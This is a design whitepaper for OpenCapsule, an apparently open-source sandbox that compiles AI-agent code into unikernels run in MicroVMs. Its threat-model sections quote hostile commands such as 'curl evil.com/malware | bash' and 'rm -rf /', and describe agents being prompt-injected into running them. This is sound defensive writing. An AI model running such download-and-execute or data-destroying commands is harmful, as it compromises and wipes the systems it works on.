# OpenCapsule

**A Secure Code Execution Runtime for AI Agents**

Version 7.0
March 2026

---

## Abstract

OpenCapsule is an open-source secure code execution runtime optimized for **AI agent execution** and ephemeral serverless functions. By combining **Unikraft unikernels** with **Firecracker MicroVMs**, OpenCapsule achieves sub-second cold starts with hardware-level isolation -- without giving AI agents dangerous shell access.

Workers expose an **HTTP REST API** for job submission, status polling, and result retrieval. Clients authenticate using **Ed25519 channel keys** and encrypt all job I/O with **XChaCha20-Poly1305**.

Unlike traditional approaches that give AI agents shell access inside containers (creating massive security risks), OpenCapsule enforces a **Planner/Executor separation**: AI agents generate code manifests, which are compiled into sealed single-purpose unikernels with no shell, no package manager, and no arbitrary network access. This solves the "Agentic Dependency Problem" -- enabling autonomous AI agents to execute code safely without the ability to install malware, exfiltrate data, or cause system-wide damage.

---

## 1. The Problem

Current code execution environments for AI agents face three structural bottlenecks:

### 1.1 The Container Bottleneck
Shipping gigabyte-sized Docker images for every job creates unacceptable latency. A typical serverless cold start on existing platforms takes 30-120 seconds.

### 1.2 The AI Agent Security Crisis
Current "agentic" AI solutions treat AI agents like human users -- giving them shell access inside containers. This is fundamentally dangerous:

- If an AI hallucinates, it can run `rm -rf /` or `curl malware.com | bash`
- Prompt injection attacks can trick agents into executing malicious code
- Supply chain attacks via compromised packages affect the entire system
- Agents can exfiltrate data through unrestricted network egress

**The shell is the wrong abstraction for AI agents.** They need to execute code, not operate environments.

### 1.3 The Deployment Friction
Existing solutions require complex infrastructure setup, container orchestration, or cloud vendor lock-in. Self-hosting a secure code execution environment should be as simple as running a single binary.

---

## 2. The OpenCapsule Solution

OpenCapsule is a self-hosted runtime that separates **code execution** from **infrastructure management**:

- **Submission** happens via HTTP REST API
- **Execution** happens in sealed unikernels inside Firecracker MicroVMs
- **Results** are returned synchronously via HTTP response

### 2.1 Key Innovations

| Innovation | Benefit |
|------------|---------|
| **Unikraft Unikernels** | 1-5MB images instead of gigabytes |
| **Content-Addressable Caching** | 99% cache hit rate for common stacks |
| **HTTP REST API** | Simple integration, no custom protocols |
| **Ephemeral Builder VMs** | Secure builds without trusting user code |
| **No-Shell Agent Execution** | AI agents cannot run arbitrary commands |
| **End-to-End Encryption** | XChaCha20-Poly1305 encrypted job I/O |

---

## 3. Comparison

| Feature | AWS Lambda | Northflank Sandboxes | OpenCapsule |
|---------|------------|----------------------|----------|
| Cold Start | 100-500ms | 1-5s | 200-500ms |
| Isolation | Container | Container | MicroVM + Unikernel |
| Payment | Credit Card | Credit Card | Configurable |
| API | Proprietary | REST | REST |
| AI Agent Shell Access | Yes (risky) | Yes (risky) | **No (safe)** |
| Runtime Package Install | Yes | Yes | No (build-time only) |
| Network Egress | Unrestricted | Configurable | Allowlist only |
| E2E Encryption | No | No | **Yes (XChaCha20-Poly1305)** |
| Open Source | No | No | **Yes** |
| Self-Hosted | No | No | **Yes** |

---

## 4. Architecture

The OpenCapsule stack consists of three layers, all implemented in Rust.

```
+-----------------------------------------------------------+
|                   USER / AGENT                            |
+-------------------------+---------------------------------+
                          | HTTP REST API
                          v
+-----------------------------------------------------------+
|              LAYER 3: API PLANE                           |
|              Axum HTTP REST API                           |
|    Job Submission . Status Polling . Result Retrieval     |
+-------------------------+---------------------------------+
                          |
                          v
+-----------------------------------------------------------+
|              LAYER 2: EXECUTION PLANE                     |
|         Firecracker MicroVMs + Unikraft                   |
|      Ephemeral Builders . Content-Addressed Cache         |
+-------------------------+---------------------------------+
                          |
                          v
+-----------------------------------------------------------+
|              LAYER 1: ISOLATION PLANE                     |
|              KVM Hypervisor (Intel VT-x / AMD-V)          |
|       Hardware Isolation . Minimal Attack Surface         |
+-----------------------------------------------------------+
```

### 4.1 Layer 1: Isolation Plane (KVM)

Hardware-enforced isolation via the KVM hypervisor:

- **Intel VT-x / AMD-V**: CPU-level guest isolation
- **Firecracker MicroVM**: Minimal VMM with ~50,000 lines of Rust
- **No shared kernel**: Each job runs in its own virtual machine
- **Memory isolation**: Hardware page tables prevent cross-VM access

### 4.2 Layer 2: Execution Plane (Firecracker + Unikraft)

Jobs run in Firecracker MicroVMs containing Unikraft unikernels. This provides:

- **Hardware Isolation**: KVM-based virtualization (no shared kernel)
- **Minimal Attack Surface**: Unikernels contain only required code
- **Fast Boot**: <200ms cold start for cached images

#### The Build Pipeline

Users submit standard Dockerfiles. The worker compiles them into minimal unikernels:

1. **Submission**: User uploads `Dockerfile` + `Kraftfile` via HTTP POST
2. **Ephemeral Builder**: Worker spawns isolated Builder VM (MicroVM-for-building)
3. **Compilation**: BuildKit + Unikraft toolchain produces `.unik` binary
4. **Handoff**: Binary passed to host, Builder VM destroyed
5. **Execution**: `.unik` runs in production MicroVM

The Ephemeral Builder has zero access to host keys, files, or network -- preventing `RUN` command exploits.

#### Build Resource Limits

| Resource | Limit |
|----------|-------|
| Build timeout | 5 minutes |
| Build memory | 4 GB |
| Build disk | 10 GB |
| Max Dockerfile layers | 50 |

Builds exceeding these limits are terminated with exit code 202 (build failure).

#### Content-Addressable Caching

Every artifact is content-addressed:

```
cache_key = hash(kernel_version + requirements_hash + code_hash)
```

**Cache Hierarchy:**

| Layer | Contents | Hit Rate | Lookup Time |
|-------|----------|----------|-------------|
| L1 | Kernel | ~100% | <1ms |
| L2 | Dependencies | ~95% | <1ms |
| L3 | User Code | Variable | <1ms |

For popular stacks (Python + Pandas, Node + Express), cold start approaches the theoretical minimum: ~125ms Firecracker boot overhead.

### 4.3 Layer 3: API Plane (HTTP REST)

Workers expose an HTTP REST API built with Axum:

- **POST /v1/jobs**: Submit a new job
- **GET /v1/jobs/:id**: Poll job status or retrieve result
- **GET /v1/jobs/:id/logs**: Stream stdout/stderr
- **GET /v1/health**: Worker health check
- **GET /v1/capabilities**: Advertised resources and pricing

All requests are authenticated via Ed25519 signatures. Job payloads are encrypted end-to-end with XChaCha20-Poly1305 (see Section 7.12).

---

## 5. Job Lifecycle

### 5.1 Job Submission

Jobs are submitted via HTTP POST with a JSON body.

**Step 1: Submission**

Client sends an HTTP POST to the worker:

```json
{
  "manifest": {
    "code_hash": "blake3:abc123...",
    "deps_hash": "blake3:def456...",
    "entrypoint": "main.py",
    "resources": {
      "vcpu": 2,
      "memory_mb": 2048,
      "max_duration_ms": 30000
    },
    "network": {
      "egress_allowlist": ["api.openai.com"]
    }
  },
  "channel_id": "xyz",
  "nonce": 42,
  "signature": "ed25519:...",
  "assets": {
    "code": { "inline": "<encrypted-base64>" },
    "input": { "inline": "<encrypted-base64>" },
    "files": [],
    "compression": "none"
  }
}
```

**Step 2: Verification**
Worker validates locally (<5ms):
- Is the Ed25519 signature valid?
- Is the channel ID recognized?
- Is the nonce higher than last seen?

**Step 3: Execution**
Worker assembles and boots MicroVM:
- Check L2 cache for dependencies (instant if hit)
- If miss, build in Ephemeral Builder VM
- Mount kernel + deps + code as block devices
- Boot Firecracker, run entrypoint

**Step 4: Result Delivery**
Worker returns the result in the HTTP response:

```json
{
  "job_id": "...",
  "exit_code": 0,
  "duration_ms": 4523,
  "encrypted_result": "<base64>",
  "encrypted_stdout": "<base64>",
  "encrypted_stderr": "<base64>",
  "signature": "ed25519:..."
}
```

For long-running jobs, clients poll `GET /v1/jobs/:id` until the job reaches a terminal state.

### 5.2 Sequence Diagram: Single Job

```
+--------+                              +--------+
|  User  |                              | Worker |
+---+----+                              +---+----+
    |                                       |
    |  1. POST /v1/jobs                     |
    |  (manifest + encrypted code + sig)    |
    |-------------------------------------->>
    |                                       |
    |                          2. Verify    |
    |                          signature    |
    |                          (local, <1ms)|
    |                                       |
    |                          3. Check     |
    |                          cache (L2)   |
    |                                       |
    |                          4. Boot VM   |
    |                          + Execute    |
    |                                       |
    |  5. 200 OK (result)                   |
    |  (encrypted result + signature)       |
    |<<--------------------------------------
    |                                       |
    |  [... repeat for subsequent jobs ...] |
    |                                       |
```

### 5.3 Sequence Diagram: DAG Workflow

```
+--------+       +----------+       +----------+       +----------+
|  User  |       | Worker A |       | Worker B |       | Worker C |
+---+----+       +----+-----+       +----+-----+       +----+-----+
    |                 |                   |                   |
    | Submit DAG      |                   |                   |
    | (3 jobs)        |                   |                   |
    |--------------->.|                   |                   |
    |                 |                   |                   |
    |                 | Run job_1         |                   |
    |                 |--------+          |                   |
    |                 |        |          |                   |
    |                 |<-------+          |                   |
    |                 |                   |                   |
    |                 | Spawn job_2       |                   |
    |                 | (distributed)     |                   |
    |                 |----------------->.|                   |
    |                 |                   |                   |
    |                 | Spawn job_3       |                   |
    |                 | (distributed)     |                   |
    |                 |------------------------------------ >.|
    |                 |                   |                   |
    |                 |                   | Run job_2         |
    |                 |                   |--------+          | Run job_3
    |                 |                   |        |          |--------+
    |                 |                   |<-------+          |        |
    |                 |                   |                   |<-------+
    |                 |                   |                   |
    |                 |  Result job_2     |                   |
    |                 |<-----------------.|                   |
    |                 |                   |  Result job_3     |
    |                 |<------------------------------------.|
    |                 |                   |                   |
    | Final Result    |                   |                   |
    |<---------------.|                   |                   |
    |                 |                   |                   |
```

### 5.4 Job State Machine

```
                    +---------------+
                    |               |
     Submit job     |   PENDING     |
    ----------------+   (queued)    |
                    |               |
                    +-------+-------+
                            |
                            | Worker accepts
                            v
                    +---------------+
                    |               |
                    |   ACCEPTED    |
                    |  (verified)   |
                    |               |
                    +-------+-------+
                            |
              +-------------+-------------+
              |                           |
              v                           v
      +---------------+           +---------------+
      |               |           |               |
      |   BUILDING    |           |   CACHED      |
      | (deps build)  |           | (cache hit)   |
      |               |           |               |
      +-------+-------+           +-------+-------+
              |                           |
              +-------------+-------------+
                            |
                            v
                    +---------------+
                    |               |
                    |   RUNNING     |
                    |  (VM booted)  |
                    |               |
                    +-------+-------+
                            |
          +-----------------+-----------------+
          |                 |                 |
          v                 v                 v
  +---------------+ +---------------+ +---------------+
  |               | |               | |               |
  |  SUCCEEDED    | |    FAILED     | |   TIMEOUT     |
  |  (exit 0)     | |  (exit 1-127) | |  (exit 128)   |
  |               | |               | |               |
  +---------------+ +---------------+ +---------------+
```

**Job States:**

| State | Duration | Next States |
|-------|----------|-------------|
| PENDING | <100ms | ACCEPTED |
| ACCEPTED | <10ms | BUILDING, CACHED |
| BUILDING | 1-60s | RUNNING |
| CACHED | <1ms | RUNNING |
| RUNNING | user-defined max | SUCCEEDED, FAILED, TIMEOUT |
| SUCCEEDED | terminal | - |
| FAILED | terminal | - |
| TIMEOUT | terminal | - |

Results are returned synchronously in the HTTP response for short-lived jobs. For long-running jobs, clients poll `GET /v1/jobs/:id` until the job reaches a terminal state.

### 5.5 Workflow State Machine

```
                         +----------------+
                         |                |
        Submit workflow  |    PENDING     |
       ------------------+                |
                         |                |
                         +-------+--------+
                                 |
                                 | Start entry job
                                 v
                         +----------------+
                         |                |<------------------+
                         |    RUNNING     |                   |
                         | (jobs active)  |-------------------+
                         |                |  Job completes,   |
                         +-------+--------+  spawn next jobs  |
                                 |                            |
               +-----------------+-----------------+          |
               |                 |                 |          |
               v                 v                 v          |
       +--------------+  +--------------+  +--------------+   |
       |              |  |              |  |              |   |
       |  COMPLETED   |  |   FAILED     |  |  PARTIAL     |--+
       |  (all done)  |  | (job fault)  |  | (some done)  |
       |              |  |              |  |              |
       +--------------+  +--------------+  +--------------+
```

**Workflow States:**

| State | Description |
|-------|-------------|
| PENDING | Workflow submitted, not yet started |
| RUNNING | One or more jobs executing |
| COMPLETED | All jobs finished successfully |
| FAILED | A required job failed (workflow aborted) |
| PARTIAL | Fan-out with some successes, some failures |

---

## 6. Pricing

### 6.1 Worker-Set Pricing

Workers advertise their rates in their configuration:

```json
{
  "pricing": {
    "cpu_ms": 0.000001,
    "memory_mb_ms": 0.0000001,
    "egress_mb": 0.01
  }
}
```

Pricing is fully configurable by the worker operator. The `GET /v1/capabilities` endpoint exposes current rates to clients.

### 6.2 Job Cost Calculation

**Maximum cost** (calculated when job starts):
```
max_cost = (vcpu * max_duration * cpu_rate) +
           (memory * max_duration * memory_rate)
```

**Actual cost** (charged after completion):
```
actual_cost = (vcpu * actual_duration * cpu_rate) +
              (memory * actual_duration * memory_rate) +
              (egress_bytes * egress_rate)
```

### 6.3 Job Tiers

| Tier | Max Duration | Max vCPU | Max Memory | Max Result |
|------|--------------|----------|------------|------------|
| Standard | 5 min | 4 | 8 GB | 50 MB |
| Compute | 30 min | 16 | 64 GB | 500 MB |

Workers advertise supported tiers via the capabilities endpoint.

---

## 7. Security

### 7.1 The AI Agent Security Problem

Current "agentic" AI solutions treat the AI like a human user -- giving it shell access (`/bin/bash`) inside a container or VM. This is fundamentally broken:

**The Problem:**
```
+-------------------------------------------------------------+
|                     DANGEROUS: Shell-Based Agent            |
+-------------------------------------------------------------+
|                                                             |
|   User: "Analyze this CSV and plot a graph"                 |
|                         |                                   |
|                         v                                   |
|   +---------------------------------------------+           |
|   |              AI AGENT                        |           |
|   |  "I'll install pandas and matplotlib..."    |           |
|   +---------------------+-----------------------+           |
|                         |                                   |
|                         v                                   |
|   +---------------------------------------------+           |
|   |         CONTAINER / VM WITH SHELL           |           |
|   |                                             |           |
|   |   $ pip install pandas matplotlib    OK     |           |
|   |   $ python analyze.py                OK     |           |
|   |   $ curl evil.com/malware | bash     !! RISK|           |
|   |   $ rm -rf /                         !! RISK|           |
|   |                                             |           |
|   +---------------------------------------------+           |
|                                                             |
|   If the AI hallucinates or is prompt-injected,             |
|   it has all the tools to cause havoc.                      |
|                                                             |
+-------------------------------------------------------------+
```

**Attack vectors in shell-based agents:**
- AI hallucinates malicious commands
- Prompt injection tricks AI into running exploits
- Supply chain attacks via compromised packages
- Lateral movement through network access
- Data exfiltration via unrestricted egress

### 7.2 The OpenCapsule Solution: Function Sandboxing

OpenCapsule moves from **"Sandboxing an Environment"** to **"Sandboxing a Function"**.

The AI agent does not "run" inside a runtime. It *requests* a build, and the system executes a sealed, single-purpose unikernel.

**The Solution:**
```
+-------------------------------------------------------------+
|                      SAFE: Manifest-Based Agent             |
+-------------------------------------------------------------+
|                                                             |
|   User: "Analyze this CSV and plot a graph"                 |
|                         |                                   |
|                         v                                   |
|   +---------------------------------------------+           |
|   |              AI AGENT (Planner)              |           |
|   |                                             |           |
|   |  Generates:                                 |           |
|   |  - Dockerfile (code + deps)                 |           |
|   |  - manifest.json (resources, egress list)   |           |
|   |                                             |           |
|   |  +------------------------------------+     |           |
|   |  | FROM python:3.11-slim-unikraft     |     |           |
|   |  | COPY analyze.py /app/              |     |           |
|   |  | RUN pip install pandas matplotlib  |     |           |
|   |  | CMD ["python", "/app/analyze.py"]  |     |           |
|   |  +------------------------------------+     |           |
|   |                                             |           |
|   |  * NO SHELL ACCESS                          |           |
|   |  * NO NETWORK ACCESS                        |           |
|   |  * NO RUNTIME ENVIRONMENT                   |           |
|   +---------------------+-----------------------+           |
|                         |                                   |
|              Submit Dockerfile + Manifest via HTTP           |
|                         |                                   |
|                         v                                   |
|   +---------------------------------------------+           |
|   |         OPENCAPSULE WORKER (Ephemeral Builder)  |           |
|   |                                             |           |
|   |  1. Spawn isolated Builder VM               |           |
|   |  2. Run BuildKit + Unikraft toolchain       |           |
|   |  3. Compile Dockerfile -> .unik binary      |           |
|   |  4. Destroy Builder VM                      |           |
|   |  5. Boot production MicroVM with .unik      |           |
|   +---------------------+-----------------------+           |
|                         |                                   |
|                         v                                   |
|   +---------------------------------------------+           |
|   |              UNIKERNEL EXECUTION            |           |
|   |                                             |           |
|   |  - NO /bin/bash         (doesn't exist)     |           |
|   |  - NO pip/apt           (doesn't exist)     |           |
|   |  - NO process spawning  (single process)    |           |
|   |  - NO arbitrary egress  (allowlist only)    |           |
|   |                                             |           |
|   |  Can ONLY: Run analyze.py -> Output result  |           |
|   +---------------------------------------------+           |
|                                                             |
+-------------------------------------------------------------+
```

**Key insight:** The `RUN pip install` in the Dockerfile executes *inside the ephemeral builder VM*, not on the host. Even if the AI writes malicious RUN commands, they're sandboxed in a disposable VM that has no access to host keys, files, or network.

### 7.3 Agent Architecture: Planner vs Executor

OpenCapsule enforces a strict separation between the **Planner** (AI) and **Executor** (Runtime):

| Layer | Role | Has Shell? | Has Network? | Can Install? |
|-------|------|------------|--------------|--------------|
| **Planner (AI)** | Generate Dockerfile + manifest | No | No | No |
| **Builder VM** | Run BuildKit + Unikraft | Isolated | Package mirrors only (PyPI, npm) | Build-time only |
| **Executor** | Run sealed .unik binary | No | Allowlist only | No |

**The AI never touches the runtime.** It only produces a Dockerfile that is compiled by an isolated, ephemeral builder VM. The builder VM:
- Has no access to host keys, files, or network
- Is destroyed immediately after producing the .unik binary
- Cannot persist any state or communicate externally

Even if the AI writes `RUN curl evil.com | bash` in the Dockerfile, that command runs inside the disposable builder -- not on the host or production runtime.

### 7.4 Why Unikernels Solve This

Traditional containers share a kernel with the host and include full OS userland:

```
Container:          Unikernel:
+-------------+     +-------------+
| App         |     | App         |
+-------------+     +-------------+
| Libraries   |     | Libraries   |
+-------------+     | (linked)    |
| /bin/bash   |     +-------------+
| /usr/bin/*  |     | Minimal     |
| apt/pip     |     | Kernel      |
+-------------+     | (no shell)  |
| Linux       |     +-------------+
| (shared)    |           |
+-------------+           |
      |                   |
      v                   v
+-------------+     +-------------+
| Host Kernel |     | Hypervisor  |
| (shared!)   |     | (isolated)  |
+-------------+     +-------------+
```

**Unikernel properties:**
- **No shell**: `/bin/bash` doesn't exist, so `exec()` attacks fail
- **No package manager**: `pip install` at runtime is impossible
- **Single process**: No ability to fork or spawn processes
- **No syscall surface**: Only syscalls needed for the app are compiled in
- **Hypervisor isolation**: Even kernel exploits don't reach the host

### 7.5 Supply Chain Security

AI agents often request packages that could be compromised. OpenCapsule mitigates this:

**1. Approved Package Mirrors**
Workers maintain mirrors of common packages (PyPI, npm) that are:
- Scanned for known vulnerabilities
- Signed by package maintainers
- Cached with content-addressing

**2. Dependency Pinning**
Manifests require exact versions and hashes:
```json
{
  "requirements": {
    "pandas": { "version": "2.1.0", "hash": "sha256:abc..." },
    "numpy": { "version": "1.26.0", "hash": "sha256:def..." }
  }
}
```

**3. Build Reproducibility**
Given identical inputs, builds produce identical outputs:
```
build(code + deps + kernel) -> deterministic hash
```

Any tampering is detectable by hash mismatch.

### 7.6 Network Egress Controls

The manifest specifies an **allowlist** of permitted endpoints:

```json
{
  "network": {
    "egress_allowlist": [
      "api.openai.com",
      "storage.googleapis.com"
    ]
  }
}
```

**Enforcement:**
- Unikernel's network stack only permits connections to allowlisted hosts
- DNS resolution restricted to allowlist
- No arbitrary outbound connections possible
- Data exfiltration prevented at the hypervisor level

**Hardening Details:**
- DNS resolved once at connection time; IP pinned for session duration (prevents DNS rebinding)
- Connections to RFC1918/loopback addresses (10.x, 172.16.x, 192.168.x, 127.x) blocked regardless of allowlist
- TLS certificate chain validated against public roots; self-signed certificates rejected
- Wildcard patterns (e.g., `*.amazonaws.com`) expanded at build time, not runtime

### 7.7 Comparison: Shell-Based vs OpenCapsule

| Capability | Shell-Based Agent | OpenCapsule Agent |
|------------|-------------------|-------------|
| Run arbitrary commands | Yes (dangerous) | No |
| Install packages at runtime | Yes (supply chain risk) | No (build-time only) |
| Access host filesystem | Possible (escape risk) | No (hypervisor isolated) |
| Arbitrary network egress | Yes (exfil risk) | No (allowlist only) |
| Spawn processes | Yes | No (single process) |
| Survive reboot | Yes (persistence) | No (ephemeral) |
| Attack surface | Full OS userland | Single binary |

### 7.8 Triple-Layer Isolation

| Layer | Component | Protection |
|-------|-----------|------------|
| Build | Ephemeral Builder VM | Prevents host compromise during Docker `RUN` |
| Storage | Content Addressing | Prevents poisoned image attacks |
| Runtime | KVM Virtualization | Prevents guest-to-host escape |

Firecracker's attack surface is approximately 50,000 lines of Rust with minimal unsafe code in the critical path. KVM provides hardware-enforced isolation via Intel VT-x/AMD-V. This is the same security model used by AWS Lambda and Fly.io.

### 7.9 Computation Integrity

OpenCapsule v1 guarantees **delivery** but not **correctness**. A malicious worker could return fabricated results. This is a known limitation.

**Mitigations:**

| Strategy | Description |
|----------|-------------|
| Reputation | Workers with high failure rates receive fewer jobs |
| Redundant Execution | Users can submit identical jobs to N workers and compare results |
| Deterministic Builds | Content-addressed caching means same inputs produce the same binary; result divergence indicates dishonesty |
| TEE Attestation | Future releases add cryptographic proof of correct execution |

For high-value computations requiring correctness guarantees before TEE support, users should employ redundant execution with majority voting.

### 7.10 Encrypted Job I/O

OpenCapsule encrypts job inputs and outputs using keys derived from the channel key relationship, providing "soft confidential computing" without requiring TEE hardware.

**Key Derivation:**
```
Channel Key = HKDF(ECDH(user_x25519, worker_x25519), salt=channel_id)
Job Key = HKDF(ECDH(ephemeral, worker_x25519) || channel_key, salt=job_id)
```

**Properties:**
- **Channel-bound**: Only parties with a valid channel key can decrypt
- **Forward secrecy**: Per-job ephemeral keys protect past data if channel keys are compromised
- **Automatic rotation**: Job ID in HKDF salt ensures unique key per job

**What Gets Encrypted:**

| Component | Encrypted? | Reason |
|-----------|------------|--------|
| Input data | Yes | User's private data |
| Code | Yes | User's proprietary logic |
| Result data | Yes | Computation output |
| stdout/stderr | Yes | May leak sensitive info |
| Job ID | No | Needed for routing |
| Resource requirements | No | Worker needs for allocation |
| Exit code | No | State machine needs |

**Encryption Scheme:** XChaCha20-Poly1305 with 192-bit random nonces (no nonce tracking required).

**Security Model:** Encrypted I/O requires a hardened node OS (Bottlerocket or equivalent) to achieve full "soft confidential" guarantees. Together they provide:
- No shell access for memory inspection
- No debugging tools
- Ephemeral execution window
- Economic incentive alignment

### 7.11 Future: TEE Integration

TEE (Intel SGX / AMD SEV) is planned as a premium tier. TEE and encrypted job I/O are **complementary**, not alternatives:

| Protection | Encrypted I/O | TEE | Both |
|------------|---------------|-----|------|
| Data in transit | Yes | No | Yes |
| Data at rest | Yes | No | Yes |
| Data during execution | No | Yes | Yes |
| Forward secrecy | Yes | No | Yes |
| Channel-bound keys | Yes | No | Yes |
| Attestation | No | Yes | Yes |

**Encrypted I/O remains required even with TEE** because:
- TEE doesn't encrypt data at rest in storage
- TEE doesn't provide forward secrecy
- TEE doesn't bind decryption to channel key

When TEE is added, decryption moves inside the enclave, but the encryption layer stays.

**TEE Use Cases:**
- Proprietary AI model inference
- Sensitive data processing
- Cryptographic proof of correct execution

### 7.12 Hardened Node OS

Worker nodes run a purpose-built operating system designed to eliminate attack surface and prevent operator tampering. This "OpenCapsule Node OS" is built with Yocto and enforces security guarantees at the OS level.

**Core Security Properties:**

| Property | Implementation |
|----------|----------------|
| **No Shell** | `/bin/sh`, `/bin/bash` removed from rootfs |
| **No SSH** | No remote shell access possible |
| **Read-Only Root** | dm-verity verified rootfs with signed root hash |
| **No Package Manager** | apk/apt/yum excluded from image |
| **Minimal Attack Surface** | <50MB image, only essential binaries |

**Shell-Less Architecture:**

Unlike traditional Linux servers, OpenCapsule nodes have no shell interpreter:

```
Traditional Server:          OpenCapsule Node:
+---------------------+     +---------------------+
| SSH -> bash          |     | Management API      |
| +-> arbitrary cmds   |     | +-> predefined ops  |
+---------------------+     +---------------------+
      | Risk                       | Safe
  Command injection            No shell to inject
  Privilege escalation         No shell to escalate
  Lateral movement             No interactive access
```

**Why This Matters:**

Even if an attacker compromises the management API or a MicroVM escapes its sandbox, they cannot:
- Execute arbitrary commands (no shell exists)
- Install backdoors (no package manager)
- Modify the rootfs (dm-verity rejects changes)
- Establish persistence (verified boot reloads clean image)

**dm-verity Integrity:**

The rootfs is protected by dm-verity, a kernel feature that verifies every block read against a Merkle tree:

```
+------------------------------------------------+
|                Root Hash                        |
|  (embedded in kernel or signed manifest)        |
+------------------------+-----------------------+
                         |
           +-------------+-------------+
           v                           v
      +---------+                 +---------+
      | Hash L1 |                 | Hash L1 |
      +----+----+                 +----+----+
           |                           |
      +----+----+                 +----+----+
      v         v                 v         v
+-------+ +-------+         +-------+ +-------+
|Block 0| |Block 1|   ...   |Block N| |Block M|
+-------+ +-------+         +-------+ +-------+
```

If any block is modified (malware, rootkit, tampering), the hash chain breaks and the kernel panics rather than executing corrupted code.

**TPM-Based Attestation:**

Nodes with TPM 2.0 hardware provide cryptographic proof of their configuration:

| PCR | Contents | Purpose |
|-----|----------|---------|
| PCR 0 | Firmware | Verify UEFI not tampered |
| PCR 7 | Secure Boot | Verify boot chain integrity |
| PCR 14 | dm-verity root | Verify exact rootfs version |

Workers can generate a TPM quote signed by their Endorsement Key. Clients verify:
1. TPM is genuine (EK certificate chain)
2. PCR values match expected golden values
3. Node is running approved OS version

**Management Without Shell:**

Operators manage nodes through a secure API instead of SSH:

```bash
# Traditional (dangerous):
ssh root@node "systemctl restart opencapsule-worker"

# OpenCapsule (safe):
opencapsulectl --node <node-id> drain
opencapsulectl --node <node-id> upgrade --version 1.2.0
opencapsulectl --node <node-id> reboot
```

See Section 10.4 for the full management API specification.

---

## 8. Failure Handling

### 8.1 Exit Codes

| Exit Code | Meaning | Refund Policy |
|-----------|---------|---------------|
| 0 | Success | N/A |
| 1-127 | User code error | Configurable |
| 128 | User timeout exceeded | Configurable |
| 200 | Worker crash | Full refund |
| 201 | Worker resource exhausted | Full refund |
| 202 | Build failure | Partial refund |

### 8.2 Logging and Observability

**Job Logs:**
Jobs can write to stdout/stderr. Output is captured and included in the result (max 1MB). For longer output, jobs should write to a file included in the result.

**Structured Errors:**
Failed jobs return structured error information:

```json
{
  "error": {
    "code": "BUILD_TIMEOUT",
    "message": "Build exceeded 5 minute limit",
    "phase": "building",
    "elapsed_ms": 300000,
    "exit_code": 202
  }
}
```

| Error Code | Phase | Description |
|------------|-------|-------------|
| `SIGNATURE_INVALID` | verification | Ed25519 signature invalid |
| `CHANNEL_UNKNOWN` | verification | Unrecognized channel ID |
| `BUILD_TIMEOUT` | building | Build exceeded time limit |
| `BUILD_OOM` | building | Build exceeded memory limit |
| `RUNTIME_TIMEOUT` | running | Execution exceeded max_duration_ms |
| `RUNTIME_OOM` | running | Execution exceeded memory_mb |
| `EGRESS_BLOCKED` | running | Attempted connection to non-allowlisted host |

**Worker Metrics:**
Workers expose a Prometheus-compatible `/metrics` endpoint for operators, including:
- `opencapsule_jobs_total{status="success|failed|timeout"}`
- `opencapsule_job_duration_seconds`
- `opencapsule_cache_hits_total{layer="L1|L2|L3"}`
- `opencapsule_active_jobs`

---

## 9. Job Orchestration

OpenCapsule supports composing multiple jobs into workflows, enabling pipelines, fan-out parallelism, and conditional execution.

### 9.1 Orchestration Modes

| Mode | Description | Use Case |
|------|-------------|----------|
| **Single** | One job, no dependencies | Simple functions |
| **DAG** | Pre-declared dependency graph | Known pipelines |
| **Dynamic** | Jobs spawn children at runtime | Conditional logic |

### 9.2 DAG Mode (Static Workflows)

When the workflow structure is known upfront, declare it in the manifest:

```json
{
  "orchestration": {
    "mode": "dag",
    "jobs": {
      "fetch": {
        "code_hash": "blake3:aaa...",
        "deps_hash": "blake3:bbb...",
        "entrypoint": "fetch.py"
      },
      "process": {
        "code_hash": "blake3:ccc...",
        "deps_hash": "blake3:ddd...",
        "entrypoint": "process.py",
        "depends_on": ["fetch"],
        "input_from": "fetch"
      },
      "summarize": {
        "code_hash": "blake3:eee...",
        "deps_hash": "blake3:fff...",
        "entrypoint": "summarize.py",
        "depends_on": ["process"],
        "input_from": "process"
      }
    },
    "entry": "fetch",
    "affinity": "same_worker"
  }
}
```

**Benefits of DAG mode:**
- Worker can pre-warm downstream jobs (fetch dependencies while job N runs)
- Cost calculated upfront (max cost known before execution)
- Clear failure semantics (abort workflow or retry failed step)
- Cache sharing between jobs on same worker

**DAG Pipelining:**

```
Time 0:  [fetch: running]     [process: loading deps]   [summarize: queued]
Time 1:  [fetch: done] ---->  [process: starts]         [summarize: loading deps]
Time 2:                       [process: done] ---------> [summarize: starts]
Time 3:                                                  [summarize: done]
```

The worker pipelines dependency loading with execution, minimizing total latency.

### 9.3 Dynamic Mode (Runtime Spawning)

When workflow shape depends on runtime decisions, jobs can spawn children programmatically:

```python
# Inside a OpenCapsule job
from opencapsule import spawn, fan_out

# Sequential spawn
result = spawn(
    code="process.py",
    input=my_output,
    affinity="same_worker"
)

# Parallel fan-out
results = fan_out(
    code="analyze.py",
    inputs=[chunk1, chunk2, chunk3, chunk4],
    affinity="distributed"
)
```

**Spawn Limits (prevent runaway costs):**

```json
{
  "orchestration": {
    "mode": "dynamic",
    "spawn_limits": {
      "max_depth": 3,
      "max_total_jobs": 50,
      "max_spawn_budget": 10.0
    }
  }
}
```

| Limit | Default | Description |
|-------|---------|-------------|
| `max_depth` | 3 | Maximum nesting level (job -> child -> grandchild) |
| `max_total_jobs` | 50 | Maximum jobs spawned in entire workflow |
| `max_spawn_budget` | 10.0 | Budget cap for all spawned jobs |

If any limit is exceeded, spawn fails and parent job receives an error.

### 9.4 Affinity Controls

Control where child jobs execute:

| Affinity | Behavior | Best For |
|----------|----------|----------|
| `same_worker` | Run on same node | Sequential chains, shared cache |
| `same_region` | Run on nearby node | Compliance, moderate latency |
| `distributed` | Run on any available node | Fan-out parallelism |

**Same-worker benefits:**
- Zero network transfer for intermediate results
- Shared dependency cache (L2 hits)
- Sub-millisecond dispatch latency

**Distributed benefits:**
- Parallel execution across many nodes
- Not limited by single node's resources
- Better for CPU-bound fan-out

### 9.5 Inter-Job Data Passing

**Same-worker:** Results passed via shared memory or local filesystem. Zero serialization overhead for large artifacts.

**Distributed:** Results passed via HTTP between workers.

```
Same-worker:     Job A --[memory]--> Job B     (< 1ms)
Distributed:     Job A --[HTTP]----> Job B     (network latency)
```

### 9.6 Failure Handling in Workflows

| Failure | DAG Mode | Dynamic Mode |
|---------|----------|--------------|
| Job fails (user error) | Abort workflow, return partial results | Parent receives error, decides |
| Job fails (worker fault) | Retry on same/different worker | Parent can retry spawn |
| Spawn limit exceeded | N/A | Spawn returns error |
| Budget exhausted | Abort remaining jobs | Spawn returns error |

